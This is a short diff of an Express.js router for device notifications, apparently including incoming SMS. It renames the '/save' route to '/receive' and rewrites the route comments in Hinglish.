@@ -7,13 +7,13 @@ import {
 
 const router = express.Router();
 
-// 🟢 Save notification from Android
-router.post("/save", receiveNotification);
+// 🔔 Device se aane wala notification (incoming SMS, etc.)
+router.post("/receive", receiveNotification);
 
-// 🔵 Get all notifications
+// 🔔 Sab notifications (for admin / logs)
 router.get("/all", getAllNotifications);
 
-// 🔴 Get notifications by unique device ID
+// 🔔 Specific device ke notifications (by uniqueid)
 router.get("/:uniqueid", getNotificationsByDevice);
 
 export default router;
